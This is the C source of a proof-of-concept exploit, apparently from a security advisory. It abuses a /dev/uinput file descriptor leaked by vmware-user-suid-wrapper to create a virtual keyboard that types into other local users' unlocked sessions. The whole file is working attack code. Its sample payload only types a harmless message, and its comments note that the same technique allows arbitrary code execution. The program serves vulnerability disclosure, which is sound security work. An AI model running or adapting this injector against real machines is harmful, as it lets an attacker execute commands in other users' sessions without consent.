/*
 * Matthias Gerstner (matthias.gerstner@suse.de)
 *
 * 2023-07-24
 *
 * Proof of concept program that shows how to inject arbitrary data from a
 * virtual input device if the caller has an open file descriptor for
 * /dev/uinput already open.
 *
 * This is based on the example found in the kernel documentation tree
 * "Documentation/input/uinput.rst".
 *
 * The keystrokes generated in this program can reach any local users login
 * consoles or graphical session and therefore can serve for arbitrary code
 * execution if any sessions are currently running unlocked on a host.
 *
 * This shows the security impact of the /dev/uinput file descriptor leak in
 * the vmware-user-suid-wrapper.
 */

#include <linux/uinput.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

volatile bool keep_running = true;

void sighandler(int) {
	keep_running = false;
}

static void emit(int fd, int type, int code, int val) {
	struct input_event ie;

	ie.type = type;
	ie.code = code;
	ie.value = val;
	/* timestamp values below are ignored */
	ie.time.tv_sec = 0;
	ie.time.tv_usec = 0;

	if (write(fd, &ie, sizeof(ie)) != sizeof(ie)) {
		fprintf(stderr, "short/bad write in emit()\n");
	}
}

const int KEYS[] = {
	KEY_Y, KEY_O, KEY_U, KEY_SPACE,
	KEY_H, KEY_A, KEY_V, KEY_E, KEY_SPACE,
	KEY_B, KEY_E, KEY_E, KEY_N, KEY_SPACE,
	KEY_H, KEY_A, KEY_C, KEY_K, KEY_E, KEY_D, KEY_ENTER
};
const size_t NUM_KEYS = sizeof(KEYS)/sizeof(int);

int main(int argc, const char **argv) {

	if (argc != 2) {
		fprintf(stderr, "%s <uinput-fd-num>\n\nfile descriptor number required\n", argv[0]);
		return 1;
	}

	int ufd = -1;

	if (sscanf(argv[1], "%d", &ufd) != 1) {
		fprintf(stderr, "%s: not a number\n", argv[1]);
		return 1;
	}

	ioctl(ufd, UI_SET_EVBIT, EV_KEY);
	for (size_t i = 0; i < NUM_KEYS; i++) {
		ioctl(ufd, UI_SET_KEYBIT, KEYS[i]);
	}

	struct uinput_setup usetup;
	memset(&usetup, 0, sizeof(usetup));
	usetup.id.bustype = BUS_USB;
	usetup.id.vendor = 0x1234; // sample vendor
	usetup.id.product = 0x5678; // sample product
	int print_res = snprintf(usetup.name, UINPUT_MAX_NAME_SIZE, "%s", "exploit device");

	if (print_res < 0 || print_res >= UINPUT_MAX_NAME_SIZE) {
		fprintf(stderr, "device name print error\n");
		return 1;
	}

	ioctl(ufd, UI_DEV_SETUP, &usetup);
	int res = ioctl(ufd, UI_DEV_CREATE);

	if (res != 0) {
		perror("ioctl(UI_DEV_CREATE");
		return 1;
	}

	signal(SIGTERM, sighandler);
	signal(SIGINT, sighandler);

	printf("Sleeping 3 seconds for input subsystem to settle\n");
	sleep(3);

	size_t key_index = 0;

	while (keep_running) {
		ioctl(ufd, UI_SET_KEYBIT, KEYS[key_index]);
		emit(ufd, EV_KEY, KEYS[key_index], 1);
		emit(ufd, EV_SYN, SYN_REPORT, 0);
		emit(ufd, EV_KEY, KEYS[key_index], 0);
		emit(ufd, EV_SYN, SYN_REPORT, 0);

		key_index++;
		if (key_index >= NUM_KEYS) {
			key_index = 0;
			printf("completed one iteration\n");
		}

		usleep(200000);
	}

	printf("Cleaning up\n");
	ioctl(ufd, UI_DEV_DESTROY);
	close(ufd);

	return 0;
}
